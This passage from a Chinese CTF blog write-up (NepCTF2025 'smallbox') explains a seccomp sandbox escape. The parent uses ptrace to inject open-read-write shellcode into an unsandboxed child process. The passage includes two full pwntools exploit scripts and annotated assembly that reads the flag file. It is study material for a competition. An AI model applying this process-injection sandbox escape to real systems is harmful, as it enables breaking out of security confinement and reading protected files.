)</span><br><span class="line">    &#123;</span><br><span class="line">      perror(<span class="string">&quot;fork&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        ;</span><br><span class="line">    &#125;</span><br><span class="line">    read(<span class="number">0</span>, (<span class="type">void</span> *)<span class="number">0xDEADC0DE000L</span>L, <span class="number">0x1000u</span>LL);</span><br><span class="line">    install_seccomp();</span><br><span class="line">    MEMORY[<span class="number">0xDEADC0DE000</span>]();  <span class="comment">//执行shellcode</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在这里我们可以看到父线程开启了sandbox的保护，子进程没有但是子进程是个无限循环。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mmap((<span class="type">void</span> *)<span class="number">0xDEADC0DE000L</span>L, <span class="number">0x1000u</span>LL, <span class="number">7</span>, <span class="number">50</span>, <span class="number">-1</span>, <span class="number">0LL</span>) == (<span class="type">void</span> *)<span class="number">0xDEADC0DE000L</span>L </span><br></pre></td></tr></table></figure>
+
+<p>在0xDEADC0DE000上创建了RWX(可读,可写，可执行）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ echo -ne &quot;expected_input&quot; | seccomp-tools dump ./smallbox</span><br><span class="line">[+] please input your shellcode: </span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0001: 0x15 0x00 0x01 0x00000065  if (A != ptrace) goto 0003</span><br><span class="line"> 0002: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0003: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>只能用ptrace</p>
+<p>所以攻击思路就是在子进程里用ORW，在到父进程执行，具体怎么绕过无限循环能先看exp(大佬原创的，我纯黏贴)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&quot;nepctf32-infg-wkc9-bblj-arh6h95nc659.nepctf.com&quot;</span>,<span class="number">443</span>,ssl=<span class="literal">True</span>,sni=<span class="string">&quot;nepctf32-infg-wkc9-bblj-arh6h95nc659.nepctf.com&quot;</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(io,<span class="string">&quot;b read&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;[+] please input your shellcode: &quot;</span>)</span><br><span class="line">shellcode =asm(<span class="string">&quot;mov r14d, DWORD PTR [rbp-0xc]&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;已获得子进程pid&quot;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;orw</span></span><br><span class="line"><span class="string">0xdeadc0de000:  0x010101010101b848  0x672e2fb848500101</span></span><br><span class="line"><span class="string">0xdeadc0de010:  0x043148010166606d  0xf631d231e7894824</span></span><br><span class="line"><span class="string">0xdeadc0de020:  0x01ba41050f58026a  0x0301f28141010102</span></span><br><span class="line"><span class="string">0xdeadc0de030:  0x6ad2315f016a0101  0x00050f58286a5e03</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">shellcode+=asm(shellcraft.ptrace(<span class="number">16</span>,<span class="string">&quot;r14&quot;</span>))</span><br><span class="line">shellcode+=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rcx,0x500000000</span></span><br><span class="line"><span class="string">loop:</span></span><br><span class="line"><span class="string">    sub rcx,1</span></span><br><span class="line"><span class="string">    test rcx,rcx</span></span><br><span class="line"><span class="string">    jnz loop</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;进程附加成功&quot;</span>)</span><br><span class="line">shellcode+=asm(shellcraft.ptrace(<span class="number">12</span>,<span class="string">&quot;r14&quot;</span>,<span class="number">0</span>,<span class="number">0xDEADC0DE000</span>+<span class="number">0x500</span>))</span><br><span class="line">shellcode+=asm(<span class="string">&quot;mov rsp,0xDEADC0DE588;mov rax, 0xDEADC0DE000;push rax;mov rsp,0xDEADC0DE800&quot;</span>)</span><br><span class="line">shellcode+=asm(shellcraft.ptrace(<span class="number">5</span>, <span class="string">&quot;r14&quot;</span>, <span class="number">0xDEADC0DE000</span>,<span class="number">0x010101010101b848</span>))</span><br><span class="line">shellcode+=asm(shellcraft.ptrace(<span class="number">5</span>, <span class="string">&quot;r14&quot;</span>, <span class="number">0xDEADC0DE000</span>+<span class="number">8</span>,<span class="number">0x672e2fb848500101</span>))</span><br><span class="line">shellcode+=asm(shellcraft.ptrace(<span class="number">5</span>, <span class="string">&quot;r14&quot;</span>, <span class="number">0xDEADC0DE000</span>+<span class="number">0x10</span>,<span class="number">0x043148010166606d</span>))</span><br><span class="line">shellcode+=asm(shellcraft.ptrace(<span class="number">5</span>, <span class="string">&quot;r14&quot;</span>, <span class="number">0xDEADC0DE000</span>+<span class="number">0x18</span>,<span class="number">0xf631d231e7894824</span>))</span><br><span class="line">shellcode+=asm(shellcraft.ptrace(<span class="number">5</span>, <span class="string">&quot;r14&quot;</span>, <span class="number">0xDEADC0DE000</span>+<span class="number">0x20</span>,<span class="number">0x01ba41050f58026a</span>))</span><br><span class="line">shellcode+=asm(shellcraft.ptrace(<span class="number">5</span>, <span class="string">&quot;r14&quot;</span>, <span class="number">0xDEADC0DE000</span>+<span class="number">0x28</span>,<span class="number">0x0301f28141010102</span>))</span><br><span class="line">shellcode+=asm(shellcraft.ptrace(<span class="number">5</span>, <span class="string">&quot;r14&quot;</span>, <span class="number">0xDEADC0DE000</span>+<span class="number">0x30</span>,<span class="number">0x6ad2315f016a0101</span>))</span><br><span class="line">shellcode+=asm(shellcraft.ptrace(<span class="number">5</span>, <span class="string">&quot;r14&quot;</span>, <span class="number">0xDEADC0DE000</span>+<span class="number">0x38</span>,<span class="number">0x00050f58286a5e03</span>))</span><br><span class="line"><span class="comment">#================================================================================================================</span></span><br><span class="line">shellcode+=asm(shellcraft.ptrace(<span class="number">13</span>,<span class="string">&quot;r14&quot;</span>,<span class="number">0</span>,<span class="number">0xDEADC0DE000</span>+<span class="number">0x500</span>))</span><br><span class="line"><span class="comment">#================================================================================================================</span></span><br><span class="line">shellcode+=asm(shellcraft.ptrace(<span class="number">17</span>,<span class="string">&quot;r14&quot;</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">shellcode+=asm(<span class="string">&quot;jmp $&quot;</span>)</span><br><span class="line">io.send(shellcode)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>ptrace请求类型详解</p>
+<ol>
+<li><code>PTRACE_ATTACH</code> (16)</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">asm(shellcraft.ptrace(<span class="number">16</span>, <span class="string">&quot;r14&quot;</span>))</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>作用</strong>：将当前进程附加到目标进程作为调试器</li>
+<li><strong>参数</strong>：<ul>
+<li><code>r14</code>：目标进程PID（子进程）</li>
+</ul>
+</li>
+<li><strong>效果</strong>：<ul>
+<li>使子进程进入暂停状态（相当于发送SIGSTOP）</li>
+<li>父进程成为子进程的调试器，可以完全控制子进程</li>
+</ul>
+</li>
+<li><strong>系统调用号</strong>：<code>__NR_ptrace = 101</code>，请求类型为16</li>
+</ul>
+<ol start="2">
+<li><code>PTRACE_GETREGS</code> (12)</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">asm(shellcraft.ptrace(<span class="number">12</span>, <span class="string">&quot;r14&quot;</span>, <span class="number">0</span>, <span class="number">0xDEADC0DE000</span>+<span class="number">0x500</span>))</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>作用</strong>：获取目标进程的寄存器状态</li>
+<li><strong>参数</strong>：<ul>
+<li><code>r14</code>：目标进程PID</li>
+<li><code>0</code>：忽略参数</li>
+<li><code>0xDEADC0DE500</code>：寄存器数据存储位置</li>
+</ul>
+</li>
+<li><strong>效果</strong>：<ul>
+<li>将子进程的所有寄存器值复制到<code>0xDEADC0DE500</code>位置</li>
+<li>结构体大小为<code>sizeof(user_regs_struct) = 216字节</code></li>
+</ul>
+</li>
+<li><strong>目的</strong>：为后续修改寄存器做准备</li>
+</ul>
+<ol start="3">
+<li><code>PTRACE_POKETEXT</code> (5)</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">asm(shellcraft.ptrace(<span class="number">5</span>, <span class="string">&quot;r14&quot;</span>, <span class="number">0xDEADC0DE000</span>, <span class="number">0x010101010101b848</span>))</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>作用</strong>：向目标进程内存写入数据</li>
+<li><strong>参数</strong>：<ul>
+<li><code>r14</code>：目标进程PID</li>
+<li><code>0xDEADC0DE000</code>：写入地址</li>
+<li><code>0x010101010101b848</code>：写入的8字节数据</li>
+</ul>
+</li>
+<li><strong>关键特性</strong>：<ul>
+<li>每次调用只能写入<strong>8字节</strong>数据</li>
+<li>需要多次调用写入完整shellcode</li>
+</ul>
+</li>
+</ul>
+<p>4.<code>PTRACE_SETREGS</code> (13)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">asm(shellcraft.ptrace(<span class="number">13</span>, <span class="string">&quot;r14&quot;</span>, <span class="number">0</span>, <span class="number">0xDEADC0DE000</span>+<span class="number">0x500</span>))</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>作用</strong>：设置目标进程的寄存器状态</li>
+<li><strong>参数</strong>：<ul>
+<li><code>r14</code>：目标进程PID</li>
+<li><code>0</code>：忽略参数</li>
+<li><code>0xDEADC0DE500</code>：寄存器数据来源位置</li>
+</ul>
+</li>
+<li><strong>效果</strong>：<ul>
+<li>将<code>0xDEADC0DE500</code>处的寄存器数据恢复到子进程</li>
+<li>关键点：虽然恢复了寄存器，但此时子进程的代码已被覆盖</li>
+</ul>
+</li>
+</ul>
+<ol start="5">
+<li><code>PTRACE_DETACH</code> (17)</li>
+</ol>
+<p>python</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">asm(shellcraft.ptrace(17, &quot;r14&quot;, 0, 0))</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>作用</strong>：分离调试器与目标进程</li>
+<li><strong>参数</strong>：<ul>
+<li><code>r14</code>：目标进程PID</li>
+<li><code>0</code>：忽略参数</li>
+<li><code>0</code>：发送给子进程的信号（0表示无信号）</li>
+</ul>
+</li>
+<li><strong>效果</strong>：<ul>
+<li>子进程恢复执行</li>
+<li>父进程不再控制子进程</li>
+</ul>
+</li>
+</ul>
+<p>阶段1: 附加和控制子进程</p>
+<ol>
+<li><p><strong>PTRACE_ATTACH(16)</strong></p>
+<ul>
+<li>父进程附加到子进程</li>
+<li>子进程暂停执行</li>
+</ul>
+</li>
+<li><p><strong>延时循环</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov rcx,0x500000000</span><br><span class="line">loop:</span><br><span class="line">  sub rcx,1</span><br><span class="line">  jnz loop</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>目的：确保附加操作完成（替代waitpid）</li>
+<li>原理：给内核时间处理附加请求</li>
+</ul>
+</li>
+</ol>
+<p>阶段2: 准备内存操作</p>
+<ol>
+<li><p><strong>PTRACE_GETREGS(12)</strong></p>
+<ul>
+<li>保存子进程当前寄存器状态</li>
+<li>存储到共享内存的0x500偏移处</li>
+</ul>
+</li>
+<li><p><strong>调整父进程栈指针</strong></p>
+<p>asm</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov rsp,0xDEADC0DE588</span><br><span class="line">mov rax, 0xDEADC0DE000</span><br><span class="line">push rax</span><br><span class="line">mov rsp,0xDEADC0DE800</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>目的：避免后续操作破坏父进程栈</li>
+<li>将栈移到共享内存的安全区域</li>
+</ul>
+</li>
+</ol>
+<p>阶段3: 注入恶意代码</p>
+<ol>
+<li><p><strong>8次PTRACE_POKETEXT(5)调用</strong></p>
+<ul>
+<li><p>向子进程内存写入64字节ORW shellcode</p>
+</li>
+<li><p>覆盖子进程原来的循环代码：</p>
+<p>asm</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">; 原始代码 (被覆盖)</span><br><span class="line">while(1): </span><br><span class="line">   jmp $   ; 机器码: EB FE</span><br><span class="line"></span><br><span class="line">; 覆盖后代码</span><br><span class="line">movabs rax,0x101010101010101  ; 新指令</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+</ol>
+<p>阶段4: 恢复执行</p>
+<ol>
+<li><strong>PTRACE_SETREGS(13)</strong><ul>
+<li>“恢复”子进程寄存器</li>
+<li>实际效果：RIP仍指向被覆盖的代码区域</li>
+</ul>
+</li>
+<li><strong>PTRACE_DETACH(17)</strong><ul>
+<li>分离父进程和子进程</li>
+<li>子进程从当前RIP开始执行（即ORW shellcode）</li>
+</ul>
+</li>
+</ol>
+<p>阶段5: 维持进程</p>
+<ol>
+<li><p><strong>父进程挂起</strong></p>
+<p>asm</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp $   ; 无限循环</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>防止父进程退出导致程序终止</li>
+<li>保持子进程继续运行</li>
+</ul>
+</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">0xDEADC0DE000:</span><br><span class="line">  ; 设置文件路径 &quot;flag&quot;</span><br><span class="line">  mov rax, 0x67616c662f2e   ; &quot;./flag&quot;</span><br><span class="line">  push rax</span><br><span class="line">  </span><br><span class="line">  ; 系统调用序列</span><br><span class="line">  mov rdi, rsp      ; 文件路径指针</span><br><span class="line">  xor esi, esi      ; O_RDONLY (0)</span><br><span class="line">  xor eax, eax      ; 清空RAX</span><br><span class="line">  mov al, 2         ; syscall号: open=2</span><br><span class="line">  syscall           ; 调用open(&quot;flag&quot;)</span><br><span class="line">  </span><br><span class="line">  ; 读取文件内容</span><br><span class="line">  mov rdi, rax      ; 文件描述符</span><br><span class="line">  mov rsi, rsp      ; 缓冲区地址</span><br><span class="line">  mov rdx, 0x100    ; 读取长度</span><br><span class="line">  xor eax, eax      ; syscall号: read=0</span><br><span class="line">  syscall           ; 调用read()</span><br><span class="line">  </span><br><span class="line">  ; 输出到标准输出</span><br><span class="line">  mov rdi, 1        ; 文件描述符: stdout=1</span><br><span class="line">  mov rsi, rsp      ; 缓冲区地址</span><br><span class="line">  mov rdx, rax      ; 实际读取长度</span><br><span class="line">  mov al, 1         ; syscall号: write=1</span><br><span class="line">  syscall           ; 调用write()</span><br><span class="line">  </span><br><span class="line">  ; 退出</span><br><span class="line">  mov al, 60        ; syscall号: exit=60</span><br><span class="line">  syscall</span><br></pre></td></tr></table></figure>
+
+<p>我就了解到这里了，还是太菜，多学吧wuuu~~~</p>
+<p>官方exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p=process(<span class="string">&#x27;./smallbox&#x27;</span>)</span><br><span class="line"><span class="comment"># p=remote(&#x27;127.0.0.1&#x27;,9999)</span></span><br><span class="line">PTRACE_GETREGS = <span class="number">12</span></span><br><span class="line">PTRACE_SETREGS = <span class="number">13</span></span><br><span class="line">PTRACE_ATTACH = <span class="number">16</span></span><br><span class="line">PTRACE_DETACH = <span class="number">17</span></span><br><span class="line">PTRACE_POKETEXT = <span class="number">4</span></span><br><span class="line">PTRACE_POKEDATA = <span class="number">4</span></span><br><span class="line"></span><br><span class="line">injected_shellcode=shellcraft.<span class="built_in">open</span>(<span class="string">&quot;/flag.txt&quot;</span>,<span class="number">0</span>)+<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rax,0</span></span><br><span class="line"><span class="string">mov rdi,3</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov rdx,0x30</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rax,1</span></span><br><span class="line"><span class="string">mov rdi,1</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov rdx,0x30</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">injected_shellcode=asm(injected_shellcode)</span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    push rdx</span></span><br><span class="line"><span class="string">    /* ptrace(request=0x10, vararg_0=pid, vararg_1=0, vararg_2=0) */</span></span><br><span class="line"><span class="string">    xor r10d, r10d /* 0 */</span></span><br><span class="line"><span class="string">    push <span class="subst">&#123;PTRACE_ATTACH&#125;</span></span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    xor edx, edx /* 0 */</span></span><br><span class="line"><span class="string">    mov esi, [rsp+0x14]</span></span><br><span class="line"><span class="string">    /* call ptrace() */</span></span><br><span class="line"><span class="string">    push SYS_ptrace /* 0x65 */</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    /* ptrace(request=0xc, vararg_0=pid vararg_1=0x0, vararg_2=shellcode+0x800) */</span></span><br><span class="line"><span class="string">    pop r10</span></span><br><span class="line"><span class="string">    push r10</span></span><br><span class="line"><span class="string">    add r10,0x800</span></span><br><span class="line"><span class="string">    push <span class="subst">&#123;PTRACE_GETREGS&#125;</span></span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    xor edx,edx</span></span><br><span class="line"><span class="string">    mov esi, [rsp+0x14]</span></span><br><span class="line"><span class="string">    /* call ptrace() */</span></span><br><span class="line"><span class="string">    push SYS_ptrace /* 0x65 */</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">    push rdx</span></span><br><span class="line"><span class="string">    add rdx,0x880</span></span><br><span class="line"><span class="string">    mov rdx,[rdx]</span></span><br><span class="line"><span class="string">    push rdx</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    mov rbx,0</span></span><br><span class="line"><span class="string">loop:</span></span><br><span class="line"><span class="string">    /* ptrace(request=0xc, vararg_0=pid vararg_1=rip+i, vararg_2=[shellcode+i+0x200]) */</span></span><br><span class="line"><span class="string">    push <span class="subst">&#123;PTRACE_POKETEXT&#125;</span></span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">    pop r10</span></span><br><span class="line"><span class="string">    push r10</span></span><br><span class="line"><span class="string">    push rdx</span></span><br><span class="line"><span class="string">    add rdx,rbx</span></span><br><span class="line"><span class="string">    mov r10,[r10+rbx+0x200]</span></span><br><span class="line"><span class="string">    mov esi, [rsp+0x1C]</span></span><br><span class="line"><span class="string">    /* call ptrace() */</span></span><br><span class="line"><span class="string">    push SYS_ptrace /* 0x65 */</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    add rbx,8</span></span><br><span class="line"><span class="string">    cmp rbx,0x100</span></span><br><span class="line"><span class="string">    jle loop</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* ptrace(request=0x10, vararg_0=pid, vararg_1=0, vararg_2=0) */</span></span><br><span class="line"><span class="string">    xor r10d, r10d /* 0 */</span></span><br><span class="line"><span class="string">    push <span class="subst">&#123;PTRACE_DETACH&#125;</span></span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    xor edx, edx /* 0 */</span></span><br><span class="line"><span class="string">    mov esi, [rsp+0x1C]</span></span><br><span class="line"><span class="string">    /* call ptrace() */</span></span><br><span class="line"><span class="string">    push SYS_ptrace /* 0x65 */</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode=asm(shellcode).ljust(<span class="number">0x200</span>,<span class="string">b&#x27;\x00&#x27;</span>)+injected_shellcode</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;shellcode:&#x27;</span>,shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>linkpwn
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://linkpwn.github.io/2025/08/01/NepCTF2025-%E9%83%A8%E5%88%86pwn%E7%9A%84wp-%E5%A4%8D%E7%8E%B0/" title="NepCTF2025-部分pwn的wp(复现)">http://linkpwn.github.io/2025/08/01/NepCTF2025-部分pwn的wp-复现/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2025/07/30/2025-Parloo%E6%9D%AF/" rel="prev" title="2025 Parloo杯">
+      <i class="fa fa-chevron-left"></i> 2025 Parloo杯
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2025/08/04/ret2csu/" rel="next" title="ret2csu">
+      ret2csu <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Time"><span class="nav-number">1.</span> <span class="nav-text">Time</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#smallbox"><span class="nav-number">2.</span> <span class="nav-text">smallbox</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="linkpwn"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">linkpwn</p>
+  <div class="site-description" itemprop="description">linkpwn的学习经历</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">74</span>
